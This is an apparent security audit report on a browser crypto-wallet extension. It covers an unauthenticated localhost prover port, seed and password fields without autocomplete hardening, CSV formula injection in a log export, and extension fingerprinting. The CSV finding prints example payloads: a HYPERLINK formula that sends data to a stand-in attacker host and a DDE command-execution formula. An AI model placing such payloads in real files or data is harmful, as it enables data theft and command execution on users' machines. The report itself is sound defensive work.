### F-1: Aztec Accelerator localhost prover has no authentication, identity check, or encryption — any co-resident process can harvest every private-transaction witness

**Impact factors**: Confidentiality of the full ZK-proving witness for every private Aztec transaction (note preimages / private-circuit inputs, and whatever signing/authwit material the prover consumes to build the proof) is exposed to any other process on the same machine, for **every Nulo wallet user**, not only those who installed the companion desktop app. Attack vector: local (co-resident, unprivileged process or a second OS user account on a shared machine). Attack complexity: low — win a `bind()` race on a fixed, well-known port at boot/login, or simply start first. Privileges required: none beyond ordinary user-level process execution (no root/admin, no browser exploit). User interaction: none — triggered automatically by the victim's normal use of the wallet (any private-transaction proof attempt).

**Evidence confidence**: high for the trust-boundary facts (verified in-repo, cited below); moderate for the exact wire content (the actual serialization is inside the external `@alejoamiras/aztec-accelerator` package, out of audit scope per `node_modules` exclusion — inferred from the `Prover` role it plays in `createPXE(node, config, { proverOrOptions: prover, ... })`).

**OWASP / CWE mapping**: CWE-306 (Missing Authentication for Critical Function); CWE-319 (Cleartext Transmission of Sensitive Information, on-loopback). OWASP A02:2021 (Cryptographic Failures) / A07:2021 (Identification and Authentication Failures).

**Trace**:
1. `apps/extension/src/accelerator/config.ts:22-24` — the accelerator endpoint is hardcoded plaintext HTTP: `ACCELERATOR_HOST = "127.0.0.1"`, `ACCELERATOR_PORT = 59833`, `ACCELERATOR_HEALTH_URL = http://127.0.0.1:59833/health`.
2. `apps/extension/src/offscreen/index.ts:100-116` — in every **production** build (`E2E_PROVERLESS` and `ACCELERATOR_REQUIRED` both false, which is every release build — verified against `.github/workflows/release.yml` and `_build-extension.yml`, neither of which set `VITE_NULO_ACCELERATOR_REQUIRED`), `factory` is passed as `undefined` into `createPxeOffscreen`.
3. `packages/aztec-runtime/src/pxe/chain-runtime.ts:129-138` — `ProductionPxeFactory`'s constructor with no options defaults `provingMode` to `"default"`; `this.required = false`, `this.host`/`this.port` are `undefined`.
4. `chain-runtime.ts:208-229` — in `buildRuntime`, because `this.required` is false, `onPhase` is `undefined` (no eager-fallback guard) and, because `host`/`port` are both undefined, `accelerator` is `undefined` too — so a bare `new AcceleratorProver({ simulator, onPhase: undefined, accelerator: undefined })` is constructed and handed to `createPXE(..., { proverOrOptions: prover, ... })` for **every** production wallet, whether or not the user ever installed the Aztec Accelerator desktop app.
5. The developers' own documentation of this exact code path confirms the SDK unconditionally probes for the accelerator and silently falls back to WASM when it's absent: `accelerator/config.ts:9-15` ("the SDK's silent WASM fallback path is preserved for **end users without Aztec Accelerator (the desktop app) installed**") and `chain-runtime.ts:32-33` ("`AcceleratorProver`, silent WASM fallback preserved, no preflight/onPhase"). This means the wallet **always** attempts to reach `127.0.0.1:59833` at proving time (a bare "is it there" probe, functionally identical to the `useAcceleratorStatus.ts:38` `/health` fetch used for the onboarding UI) and, if something answers convincingly, hands over the real proving job.
6. `apps/extension/src/onboarding/composables/useAcceleratorStatus.ts:13-15` — the developers' own comment states the only "authorization" model: "the accelerator emits `Access-Control-Allow-Origin: *`... We also added `http://127.0.0.1/*` to `host_permissions`... for belt-and-suspenders authorization." Neither of those authenticates the *server* to the *client* — they only relax the browser's same-origin policy so the extension is *allowed* to talk to whatever is listening on that port. There is no shared secret, no TLS, no signature, and no version/nonce challenge-response that would let the extension distinguish the genuine Aztec Accelerator binary from an impostor.

**Missing control**: no mutual authentication of the localhost peer (e.g., a per-install shared token minted by the extension and required in every request, or a Unix-domain-socket / named-pipe with OS-level ACLs instead of a TCP port anyone can bind), no TLS/integrity protection of the witness in transit, no server identity/version handshake beyond a self-reported JSON blob that carries no proof of authenticity.

**Exploit story**: A malicious (or merely misbehaving) local application — another user's process on a shared/multi-user workstation, malware already running at the victim's own privilege level, or simply a second unrelated app that happens to bind port 59833 first — starts an HTTP listener on `127.0.0.1:59833` before (or instead of) the real Aztec Accelerator. It answers `GET /health` with `{status:"ok", bb_available:true, ...}` to pass the extension's health probe (`useAcceleratorStatus.ts` / the accelerator library's internal status check). The next time the victim sends any private Aztec transaction, `AcceleratorProver` (constructed with no auth material) forwards the real proving request — which necessarily carries the transaction's private witness, since that is what a BB-SNARK prover computes over — to this attacker-controlled listener. The attacker now has the plaintext private inputs for that transaction (note contents / private-circuit witness) with zero indication to the victim that anything is wrong (the wallet UI shows normal proving progress either way).

**Preconditions**: attacker already runs unprivileged code on the same machine as the victim (a realistic bar on shared workstations, compromised-but-not-yet-privileged endpoints, or via any other locally-installed malware/PUP), and either wins the bind race for port 59833 or starts before the legitimate accelerator app. No browser exploit, no phishing, no wallet-unlock bypass needed.

**Why mitigations fail**: `host_permissions: ["http://127.0.0.1/*"]` and the accelerator's wildcard CORS are explicitly described in-repo as "authorization," but both only concern *browser-side* same-origin relaxation — they say nothing about *who* is running the server the extension is authorized to talk to. `ACCELERATOR_REQUIRED`'s `onPhase` throw-on-fallback guard (the only place any preflight/verification logic exists) is compiled out of every release build (`ACCELERATOR_REQUIRED` is `false`), so it provides no protection for real users.

**Instances**: `apps/extension/src/accelerator/config.ts:9-26`, `apps/extension/src/offscreen/index.ts:96-116`, `packages/aztec-runtime/src/pxe/chain-runtime.ts:122-250`, `apps/extension/src/onboarding/composables/useAcceleratorStatus.ts:13-56`, `apps/extension/manifest/manifest.config.ts:20` (the `http://127.0.0.1/*` grant that makes the fetch/CORS possible at all).

### F-2: Wallet master-password and recovery-phrase inputs carry no `autocomplete` hardening — browser password manager can silently capture the seed/master secret

**Impact factors**: Confidentiality of the wallet's master password (profile creation/import, change-password) and, on the seed-phrase-entry field specifically, the actual 24-word recovery phrase (full and irrevocable control of every account) can be captured by the browser's native credential-save heuristics and, if browser Sync is enabled, replicated to the user's cloud account and any other synced device. Attack vector: none required from a remote attacker — this is a passive design gap that widens the blast radius of any *later*, unrelated compromise (malware reading Chrome's `Login Data` SQLite store, a shared-computer shoulder-surf of `chrome://settings/passwords`, a compromised/attacker-linked Google account with Chrome Sync). Attack complexity: none (happens automatically on ordinary use unless the user manually declines the browser's save-password prompt every time). Privileges required: none. User interaction: passive (must not decline the browser's own prompt).

**Evidence confidence**: high for the code fact (verified below); moderate for the exact browser trigger conditions, which are Chromium-internal heuristics I cannot execute in this pass — the finding is reported on the concrete, verifiable absence of the standard hardening attribute, not on a live browser reproduction.

**OWASP / CWE mapping**: CWE-522 (Insufficiently Protected Credentials). OWASP A04:2021 (Insecure Design).

**Trace**:
1. `apps/extension/src/onboarding/pages/create.vue:114` — profile creation is a **real, submitted `<form @submit.prevent="handleSubmit">`** (the classic trigger shape for Chromium's "Save password?" heuristic: a form with password-type field(s) and a submit event), containing two `type="password"` `<Input>`s (`create.vue:156-168`, new password + confirm) with no `autocomplete` prop passed at all.
2. `apps/extension/src/components/composite/import/ImportSecretForm.vue:41-48` — the **recovery-phrase** field itself is rendered `:type="hideCredentials ? 'password' : 'text'"` (i.e. a real password-type input when hidden, which is the default) with no `autocomplete`; the same file's new/confirm-password fields (`:75-111`) likewise carry none.
3. `apps/extension/src/components/composite/SecretUnlockSection.vue:29-40` — the password gate reused by both `export/seed.vue` and `export/account.vue` (unlocking the recovery-phrase/private-key export flows) sets `type="password"` with no `autocomplete`.
4. `apps/extension/src/popup/pages/settings/security/change-password.vue:112,155,185` — all three password fields (current/new/confirm) likewise carry no `autocomplete`.
5. `packages/design/src/ui/Input.vue:77-80` — the shared `Input` component's `autocomplete` prop is optional with **no default value**; when the caller omits it, Vue emits no `autocomplete` attribute at all (`Input.vue:297`), so the browser falls back to its own default handling for `type="password"`.
6. Contrast: `apps/extension/src/popup/pages/auth.vue:257` is the **only** password-bearing field in the whole extension that sets `autocomplete="current-password"` (confirmed via `grep -rn "autocomplete" apps/extension/src`, three total hits, two of which are unrelated — `RecipientField.vue`'s doc-comment and `SearchField.vue`'s `autocomplete="off"`). This shows the omission on the secret-creation/entry surfaces is not a deliberate, considered choice made consistently across the codebase — the one path that got it right is the pre-existing daily-unlock screen, not the higher-stakes seed/master-password paths.

**Missing control**: the design system already exposes the plumbing (`autocomplete` prop, plus a `disablePaste` prop that exists but is likewise unused on these fields) — none of the secret-bearing call sites use it to signal "do not offer to save this" to the browser.

**Exploit story**: A user creates or imports a profile. Chrome's native "Save password?" bubble appears after the form submits (per Chromium's default heuristic for a submitted form containing password fields). The user — who has been trained by every other website to click "Save" — accepts. The wallet's master password (and, on the import path, potentially the recovery phrase itself, since it is also a `type=password` field) is now stored in Chrome's password manager, visible in plaintext via `chrome://settings/passwords` to anyone with OS-session access, and — if Chrome Sync is enabled — replicated to the user's Google account and every other signed-in device.

**Preconditions**: default Chromium password-manager behavior is active (it is, absent an extension-level opt-out or enterprise policy), and the user does not manually decline the save prompt.

**Why mitigations fail**: the "defense-in-depth: zero out secret material on unmount" comments in `create.vue:96-102`/`import.vue:120-126` scrub the **in-memory Vue ref**, which has no bearing on a value the *browser itself* already captured out-of-band via its native password-manager hook at submit time — the two mechanisms operate on entirely different copies of the secret.

**Instances**: `apps/extension/src/onboarding/pages/create.vue:156-168` (form at `:114`), `apps/extension/src/onboarding/pages/import.vue` (via `ImportSecretForm.vue:41-48,75-111`), `apps/extension/src/components/composite/SecretUnlockSection.vue:29-40` (used by `popup/pages/settings/security/export/seed.vue:127-132` and `export/account.vue:258-263`), `apps/extension/src/popup/pages/settings/security/change-password.vue:112,155,185`.

### F-3: Log-viewer CSV export has no formula-injection neutralization (CSV/"Excel formula" injection)

**Impact factors**: Integrity/availability on the analyst's own machine at export-and-open time (arbitrary formula execution inside whatever spreadsheet application opens the exported file — historically including OS command execution via Excel's legacy DDE functions, or silent outbound data exfiltration via `=WEBSERVICE()`/`=HYPERLINK()`-style formulas) — not a remote/network attack, but a genuine, unmitigated sink. Attack vector: local, triggered when a user (commonly following a support/debugging request) exports the wallet's activity log to CSV and opens it in a spreadsheet app. Attack complexity: low once any logged value can be made to start with `=`, `+`, `-`, or `@`. Privileges required: none extra (any web page a Nulo user visits, or any on-chain contract the user's wallet talks to, can attempt to shape the strings that eventually get logged). User interaction: required (the user must export and open the CSV) — this is what keeps it from being a fully automatic remote compromise.

**Evidence confidence**: high for the sink (verified, no formula-prefix neutralization exists anywhere in the pipeline); moderate for a fully-worked concrete payload reaching an **unprefixed** cell — every call site enumerated in this pass that logs attacker-influenced content prefixes it with a literal string (e.g. `` `[Execute] previewTokenMetadata failed for ${op.address}: ${msg}` ``) or routes it through `JSON.stringify` (which always starts the cell with `{`), both of which happen to defeat the leading-character trigger for those specific instances. I did not find, in the time available across this ~90k-LOC app, one call site logging a raw, wholly-attacker-controlled string with literally no prefix and no object-wrapping — except the one flagged below, which depends on a promise-rejection reason that is a bare string rather than an `Error` instance (unconfirmed whether that ever occurs in practice for this codebase's RPC layer). Reported as a finding because the **sink itself has zero defense**, which is the class of bug that is invisible until the *next* engineer adds a call site that doesn't happen to have a safe prefix.

**OWASP / CWE mapping**: CWE-1236 (Improper Neutralization of Formula Elements in a CSV File). OWASP A03:2021 (Injection).

**Trace**:
1. `apps/extension/src/components/JsonViewer/logs-csv.ts:11-26` — `buildLogsCsv` builds each cell as `` `"${String(value).replace(/"/g, '""')}"` `` — this escapes embedded double-quotes only (prevents column/row-breaking), and does **nothing** about a value whose first character is `=`, `+`, `-`, or `@`, which is precisely what triggers formula evaluation in Excel/LibreOffice/Google Sheets regardless of the surrounding quoting.
2. `apps/extension/src/components/JsonViewer/logs-format.ts:27-53` (`formatArg`/`formatLogData`) — for a plain string log argument, the value is returned verbatim (no escaping applied at this layer either); only object/array arguments get `JSON.stringify`-wrapped (which happens to start with `{`/`[`, incidentally defeating the trigger for those cases only).
3. `apps/extension/src/components/JsonViewer/LogsViewer.vue:141-153` (`exportLogsToCSV`) — reachable by any signed-in user who has toggled Developer Mode in `apps/extension/src/popup/pages/settings/advanced/index.vue:175` (a self-service UI toggle, not a privileged boundary) and opened `#/windows/logger` via `:45`.
4. Candidate unprefixed source: `apps/extension/src/utils/core.ts:164` — `for (const result of await Promise.allSettled(refreshes)) { if (result.status === "rejected") console.error(result.reason) }`. If `result.reason` (the rejection of a background `refreshTokenBalance` RPC, which ultimately talks to node/PXE state that a malicious token contract or RPC endpoint influences) is ever a bare string rather than a `WalletError`/`Error` instance, `console.error` receives it as a lone argument, `trim()` passes a primitive string through unchanged, and `formatLogData`/`formatArg` emit it verbatim as the entire CSV cell.

**Missing control**: the standard mitigation — prefixing any cell value that starts with `=`, `+`, `-`, `@`, or a leading tab with a neutralizing character (e.g. a leading `'` or space) before writing the CSV — is absent from `buildLogsCsv`.

**Exploit story**: An attacker (a malicious dApp, a malicious/compromised RPC endpoint, or a malicious on-chain contract whose custom Noir assertion messages or metadata the wallet surfaces on failure) arranges for some value the wallet ends up logging to consist of, or begin with, a formula string such as `=HYPERLINK("http://attacker.example/leak?d="&A1,"open")` or a legacy `=cmd|'/c calc'!A0`-style DDE payload. A user later exports logs to CSV (e.g., asked to do so by "support") and opens the file in Excel; the formula executes with the analyst's own privileges.

**Preconditions**: Developer Mode enabled (self-service), the "Export CSV" action taken, and the resulting file opened in a spreadsheet application with formula execution enabled (the default in many still-deployed Excel/LibreOffice configurations; modern Excel's Protected View reduces but does not eliminate this class for locally-saved, user-opened files).

**Why mitigations fail**: the redaction layer (`wallet/logger/utils.ts` `trim()`) is a **key-name** allowlist/denylist walker over objects — it has no concept of "this string, regardless of key, must not start with a spreadsheet-formula character," and a finished string argument to `console.*` is opaque to it by the code's own documented design (`log-payload-ban.test.ts` header comment).

**Instances**: `apps/extension/src/components/JsonViewer/logs-csv.ts:11-26` (the sink, single root cause); candidate source `apps/extension/src/utils/core.ts:164`.

### F-4: `web_accessible_resources` exposes a static asset to every web origin, enabling silent extension-presence fingerprinting

**Impact factors**: Confidentiality/privacy — any website the user visits can silently determine "this browser has the Nulo wallet installed" without any user interaction, by attempting to load a known extension-relative resource URL and checking for success. Attack vector: network/remote (any web page). Attack complexity: low (a single `<img>`/`fetch` probe against the well-known Chrome-Web-Store-assigned extension ID). Privileges required: none. User interaction: none (silent, on page load).

**Evidence confidence**: high (directly verified in the manifest source).

**OWASP / CWE mapping**: CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor). Closest OWASP Top 10 bucket: A01:2021 (Broken Access Control) / A05:2021 (Security Misconfiguration) — browser-extension fingerprinting doesn't map cleanly onto the web-app-centric Top 10, but CWE-200 is precise.

**Trace**: `apps/extension/manifest/manifest.config.ts:55-60` — `web_accessible_resources: [{ matches: ["*://*/*"], resources: ["src/assets/logo.png"] }]`. The `matches` pattern is unrestricted (every origin, not just Nulo's own `nulo.sh`/`tools.nulo.sh`), so any web page (including a phishing/drainer site) can attempt `fetch(chrome-extension://<published-id>/src/assets/logo.png)` (or an `<img onerror/onload>` probe) and, on success, conclude the visitor has Nulo installed.

**Missing control**: scoping `matches` to Nulo's own origins only (`https://nulo.sh/*`, `https://tools.nulo.sh/*`), which would still let the wallet's own web properties display the icon (if that's the actual need) while denying arbitrary third-party sites the same probe.

**Exploit story**: A phishing site or a drainer campaign's landing page silently fingerprints every visitor for "has Nulo installed"; visitors who test positive are shown a Nulo-branded fake "Connect Wallet"/update phishing flow, while everyone else sees a generic lure or nothing — raising the phishing page's conversion rate and helping attackers target Nulo's specific user base without any indication to the victim that they were fingerprinted.

**Preconditions**: the extension's real, published Chrome-Web-Store ID must be known to the attacker (true the moment it's published/listed) — no other precondition.

**Why mitigations fail**: there is no mitigation in place for this specific vector; it is a manifest-configuration choice, not a code defect elsewhere compensating for it.

**Instances**: `apps/extension/manifest/manifest.config.ts:55-60` (single instance; Firefox overlay `manifest.firefox.config.ts` does not narrow it either — it only filters `permissions`, not `web_accessible_resources`).

## Non-findings

- **Manifest permissions are all justified by an in-repo consumer**: `downloads` → `apps/extension/src/utils/files.ts` (`downloadFile`, used by log/backup/account-export flows); `unlimitedStorage` → the offscreen PXE's encrypted OPFS/SQLite store (`vite.config.ts:240-267`); `sidePanel` → `manifest.config.ts:28-30` (`side_panel.default_path`); `alarms` → the price-refresh alarm (`wallet/index.ts:88-96`); `offscreen` → Chrome-only PXE host, correctly stripped for Firefox (`manifest.firefox.config.ts:12`). No unused or unexplained permission found.
- **`host_permissions: ["https://nulo.sh/"]` is not a fetch/XHR trust grant to nulo.sh content** — it exists solely to satisfy Chrome's requirement that an extension calling `navigator.credentials.create/get` with an `rp.id` different from its own `chrome-extension://` origin must hold an explicit host permission for that RP domain (confirmed by the drift-guard `apps/extension/src/wallet/services/passkey/check-rp-id.ts:1-45`, which asserts exactly `https://${RP_ID}/` — `RP_ID = "nulo.sh"`, `wallet/services/passkey/spec.ts:21` — is present in `host_permissions`). No production code path `fetch()`s or otherwise programmatically accesses `nulo.sh`; every reference found is a user-initiated `window.open`/`<a target=_blank>` to static help/forms URLs (`popup/pages/settings/about.vue`, `export/seed.vue:32`, `export/full.vue:57`, etc.), none of which needs `host_permissions` at all. The `/` path (not `/*`) further means even a hypothetical programmatic use could only reach the exact root path, not arbitrary subpaths.
- **`host_permissions: ["http://127.0.0.1/*"]`** — explained (and separately findings-worthy, see F-1) by the accelerator health/proving fetches; no evidence of any other use.
- **CSP omits `connect-src`/`frame-src`/`object-src`, technically permitting arbitrary `fetch`/XHR and iframing from extension pages** — confirmed no compensating restriction exists, but **no concrete injection sink was found** that would let an attacker supply the URL fetched or framed: zero `v-html`/`innerHTML`/`dangerouslySetInnerHTML`/`eval(`/`new Function(` in production `src/**` (re-verified for this cluster's directories; matches the sibling repo-map's whole-shell finding), and zero `<iframe>` elements anywhere in the extension's Vue templates (`grep -rn "<iframe" apps/extension/src` → no hits). This is a real defense-in-depth gap worth fixing but is excluded per the audit's "defense-in-depth without a concrete vector" rule.
- **COOP `same-origin` / COEP `require-corp`** — present and correctly configured for bb.js multithreaded WASM; no gap.
- **e2e build-flag production reachability** — every `VITE_NULO_E2E_*` flag (`PROVERLESS`+`_CONFIRM`, `MIGRATION_FIXTURE`, `TOKEN_SEEDS`+`_CONFIRM`) is read exactly once at module-evaluation time via `import.meta.env.X`, which Vite inlines as a compile-time constant; `E2E_PROVERLESS`/`E2E_TOKEN_SEEDS` are fail-closed double-opt-in (an exactly-one-set misconfiguration throws at build/boot, verified in `src/e2e/config.test.ts`), and `_build-extension.yml:106-119` greps every built `dist/{chrome,firefox}` for ten distinct markers covering all of proverless, migration-fixture, backup-migration-fixture, token-seeds, and the composition-test fake. `VITE_NULO_ALLOW_IFRAME_DAPPS` (`wallet/services/wallet-sdk/{background,content-message-relay}.ts`) and `VITE_NULO_FEE_MULTIPLIER` / `VITE_NULO_E2E_DEFAULT_NET` (out-of-cluster-scope services, checked because Q3 named them explicitly) are single booleans/strings with no build-time marker, but I confirmed neither `.github/workflows/release.yml` nor `_build-extension.yml` sets any of `VITE_NULO_ALLOW_IFRAME_DAPPS`/`VITE_NULO_FEE_MULTIPLIER`/`VITE_NULO_E2E_DEFAULT_NET`/`VITE_NULO_ACCELERATOR_REQUIRED` — they appear only in `_extension-smoke-e2e.yml`/`_extension-network-e2e.yml`/`scripts/e2e/agent.sh`, workflows that never feed the release build's job environment. `src/e2e/config.ts` never reads `import.meta.env` outside module-evaluation time (no runtime re-read that could survive DCE).
- **Clipboard secret-copy hygiene matches its documented design and is sound**: `composables/useSecretClipboardCopy.ts` writes the secret synchronously inside the user gesture, unconditionally scrubs (`writeText("")`) 60s later regardless of write outcome, and the accepted trade-off (no `clipboardRead` permission → can't equality-check before scrubbing) is explicitly documented and reasonable given the alternative (requesting a broader, more dangerous permission). `utils/clipboard.ts`'s `copyToClipboard` only shows a "copied" toast after the write actually resolves (no false positives).
- **Recovery-phrase display/clearing**: `popup/pages/settings/security/export/seed.vue` holds the phrase only in a component `ref`, nulls it in `onBeforeUnmount` (`:87`) and on `handleClose` (`:42`), auto-closes after 5 minutes via `useSecretCountdown`, and is never written to a Pinia store or `chrome.storage` (confirmed: `grep` across `src/stores/*.ts` for `password|seedPhrase|mnemonic|privateKey|secret` found only an unrelated Aztec `claimSecret` domain term in `activity.store.ts`, no wallet-secret residency in any store).
- **`src/setup/` is genuinely dead code, not a hidden attack surface**: it renders only `install.vue`/`update.vue`, two static "installed"/"updated" placeholder pages with zero data flow, zero service-client usage, zero user input. It shares the merged `~pages` route table with `popup`/`onboarding` (so `chrome-extension://<id>/src/setup/index.html#/windows/execute?requestId=X` would technically render the execute-approval UI too), but this unlocks no new capability: `chrome.runtime` messaging is not shell-scoped, `web_accessible_resources` does not expose `src/setup/index.html` to web content (only `src/assets/logo.png` is, see F-4), and `execute`'s approval logic is gated entirely on a live SW-side `requestId` lookup, not on which HTML document loaded it.
- **Side panel introduces no window-id-keyed security assumption**: `WindowManager` (`wallet/services/window-manager/window-manager.ts`) keys every approval handle by a random `handleId`, never by `chrome.windows` id, for anything security-relevant; `windows.getLastFocused()` is used only to *center* a new approval popup cosmetically (`centerOn`, `:22-29`). A docked side panel is a distinct Chrome construct from `chrome.windows.create` popups and does not interact with this logic.
